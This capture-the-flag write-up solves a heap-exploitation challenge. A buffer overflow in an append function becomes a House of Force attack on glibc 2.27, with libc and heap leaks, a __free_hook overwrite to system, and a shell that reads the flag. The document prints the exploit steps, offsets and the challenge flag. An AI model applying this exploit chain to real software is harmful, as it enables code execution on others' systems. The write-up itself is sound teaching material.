# forge

> Pwn · Medium · Iulian Schifirnet  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{tRBfcfVfgu8ZUKKuh1oyXjEq}
```

**Challenge**

> A mobile field forge the Ash Army hauls behind the line, stamping out replacement parts on demand:
> any size, no questions asked. The duty smith keeps a rack of work orders you can open, extend, read
> back and scrap. Push an order past what the metal can hold, turn the forge's own bookkeeping against
> it, and bend the next pour to a command of your choosing.

A per-team TCP service with source provided: `forge.c`, the `forge` binary, and the shipped
`ld-linux-x86-64.so.2` + `libc.so.6`. The binary is ELF64 PIE, not stripped, built
`-fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now` — **PIE, full RELRO, NX, stack canary** all
on (the ELF has `DT_FLAGS=BIND_NOW`, `PT_GNU_RELRO`, a non-exec `PT_GNU_STACK`, and imports
`__stack_chk_fail`). The libc is **GNU libc 2.27 (Ubuntu GLIBC 2.27-3ubuntu1.6)**, which still has
`__free_hook` and no top-chunk size check. The source header comment even names the technique:
`House of Force (glibc 2.27, Ubuntu 18.04)`.

The menu is a 16-slot note manager (`MAX_NOTES = 16`), each note a `{ char *data; size_t size; }`:
**forge** (`malloc(size)` for an arbitrary size, then read `size` bytes of content), **temper**
(append to an existing note), **inspect** (`puts(notes[i].data)`), **melt** (`free` and clear the
slot). Four verbs over a rack of notes — a textbook heap menu, which is exactly where the intended
primitive lives.

**Approach / walkthrough**

The content reader never NUL-terminates (`read_until_nl` reads up to `n` bytes, stops at `'\n'`, and
does not store a terminator), and `temper` is the bug:

```c
char *p = notes[i].data;
read_until_nl(p + strlen(p), notes[i].size);   // BUG: should be size - strlen(p)
```

Two faults compound. It writes at `p + strlen(p)` with a length of the *full* `notes[i].size` rather
than the remaining space — a heap overflow past the chunk. And because content is never
NUL-terminated, `strlen(p)` walks *into the adjacent chunk's header/data*, so the write offset is
itself controllable by what already sits after the chunk. That lets us land a write precisely on a
neighbor's **size field**.

glibc 2.27 has tcache but no size sanity on the top chunk, so the intended path is House of Force:
corrupt the top-chunk size to a huge value, then request a crafted `malloc` size to move the top chunk
to an arbitrary address and allocate there. With all protections on, we need a libc leak, a heap leak,
the top-size corruption, then a write into `__free_hook`. The full script is
`workspace/9137-forge/exploit.py` (pwntools); run it in `csctf-pwn:1`, loading the shipped 2.27
loader/libc (`./ld-linux-x86-64.so.2 --library-path . ./forge`). The four menu helpers in the script
mirror the service protocol exactly — `forge(size, data)` sends menu choice `1`, the `size>` prompt,
and the `content>` payload and parses back the `forged #<n>` slot index; `temper(i, data)` answers
`index>` and `more content>`; `inspect(i)` reads the `puts` output after `: `; `melt(i)` frees slot
`i`.

1. **libc leak (unsorted bin).** `forge(0x500, b'a')` (note A, slot 0) falls outside tcache; freeing
   it puts it in the unsorted bin, whose `fd`/`bk` point into `main_arena`. A note B of size `0x18`
   holding `"/bin/sh"` is forged right after A (before A is freed, slot 1) so A does not merge into
   top when freed — and B also holds the command string handed to `free`/`system` later. Re-forge the
   same 0x500 size with empty content (`forge(0x500, b'')`, reusing slot 0 from the 0x500 tcache/bin,
   leaving the arena pointer in `fd` intact) and `inspect` it:

   ```python
   libc = u64(inspect(a).ljust(8, b'\0')) - UNSORTED   # UNSORTED = 0x3ebca0 (main_arena+96)
   assert libc & 0xfff == 0                            # sanity: page-aligned base
   ```

   The read-back qword is `main_arena+96`, so `libc_base = leak - 0x3ebca0`.

2. **heap leak (tcache next).** Forge two 0x18 notes C and D (slots 2, 3), `free` both (`melt(c); melt(d)`
   → 0x20 tcache bin holds D → C), then re-forge one 0x18 note. It returns D, whose first 8 bytes are
   the tcache `next` pointer to C's user data. `inspect` leaks it:

   ```python
   c_user = u64(inspect(d).ljust(8, b'\0'))
   top    = c_user + 0x30     # D chunk = C chunk + 0x20, top = D chunk + 0x20
   ```

3. **corrupt the top size (the strlen trick).** D is the last chunk before top. Using `temper` on D:

   ```python
   temper(d, b'A' * (0x18 - 6))   # fill D's 0x18 bytes (6 bytes of leaked ptr already non-NUL)
   temper(d, b'\xff' * 5)         # strlen now walks to top's size; overwrite its upper bytes
   ```

   The second `temper` sets the top size to `0xffffffffff020841`. Derived from the layout
   (`tcache_perthread_struct` `0x250`, A `0x510`, B/C/D `0x20` each), top sits at heap+`0x7c0` with
   size `0x21000 - 0x7c0 | PREV_INUSE = 0x20841`; its three low bytes (`41 08 02`) are non-zero, so
   `strlen` stops at byte 3 and the five `0xff` bytes cover bytes 3..7. The remote leak
   `C user = …790` (heap+`0x790`) matches this layout.

4. **House of Force into `__free_hook`.** With a giant top size, request exactly the gap to move top
   just below `__free_hook`, then allocate the hook:

   ```python
   target_top = libc + 0x3ed8e8 - 0x18       # __free_hook - 0x18
   req        = target_top - top - 8         # request2size(req) == target_top - top (16-aligned)
   forge(req, b'')                            # top chunk now at __free_hook-0x18
   forge(0x28, b'X'*8 + p64(libc + 0x4f420))  # returns __free_hook-8; writes system into __free_hook
   ```

   The `0x28` request (not `0x18`) matters: the 0x20 tcache bin still holds C, so a 0x18 request would
   be served from tcache instead of the relocated top. `0x28` gives `nb = 0x30`, pulled from top and
   landing the 8-byte `X` pad followed by `system` exactly on `__free_hook`.

5. **Trigger.** `melt(B)` calls `free(notes[B].data)` where B's data is `"/bin/sh"`, and now
   `__free_hook == system`, so this is `system("/bin/sh")`. The script then sends
   `echo PWNED; cat flag* /flag* 2>/dev/null; ls /` down the shell and reads the flag back.

Offsets (from the shipped libc 2.27): `main_arena+96` = `0x3ebca0`, `__free_hook` = `0x3ed8e8`,
`system` = `0x4f420` (cross-checked: `__malloc_hook=0x3ebc30` → `main_arena=0x3ebc40` →
`main_arena+96=0x3ebca0`).

**Why it works**

The real subtlety is not House of Force itself but the non-terminating reader: `strlen` over
un-NUL-terminated heap data turns `temper` into a precise write primitive onto a neighbor's size
field. A wrong append length plus missing terminators overwrite the top chunk's size; glibc 2.27 does
not validate top's size, so a forged huge top lets `malloc` return memory at any chosen offset. With
`__free_hook` still present in this version, one write there gives code execution on the next `free`,
and B's `"/bin/sh"` makes that `free` into `system("/bin/sh")`. Matching the shipped loader and libc
exactly is what makes every offset land deterministically.

**Validation / reproduction**

Triage (`./csctf pull`) routed the challenge to `docs/playbooks/pwn.md` and the pwn engines
(`solvers/toolkits/pwn*.py`, `solvers/binary/binfmt.py`); because full source was shipped, the solve
came from reading `forge.c` by hand (the header comment even says `House of Force (glibc 2.27, Ubuntu
18.04)`), with no engine output used for the exploit itself. The binary was run only inside
`csctf-pwn:1`, using the shipped loader and libc, never on the host. The exploit got a shell plus a
local test flag, then ran unchanged, once, against our assigned instance — which matched the shipped
glibc 2.27, so no offset adaptation was needed:

```
libc   0x7839c1dd4000
C user 0x5572b2717790
-> shell -> cat flag* /flag*   (notes.md records the post-shell command as `cat /flag`)
CSCTF{tRBfcfVfgu8ZUKKuh1oyXjEq}
```

One run, first attempt correct (`tried.json`: one submission, `correct`). The flag is a per-instance
random value; the one above is from our assigned instance.

Reproduce: `python3 exploit.py` (local, via the shipped loader) or `python3 exploit.py <instance>`
after re-reading the instance's connection info. Gotchas: the exploit depends on matching the shipped
2.27 ld/libc exactly (the image's own glibc differs, so it loads the challenge directory's copies);
the `0x28` final request must avoid the stale 0x20 tcache entry; and the five `0xff` `temper` bytes
rely on the top size's three non-zero low bytes stopping `strlen` at byte 3. Note: no transcript of
the exploit run was saved in the workspace, so the leaked addresses above are from `notes.md`, not a
re-run for this write-up.
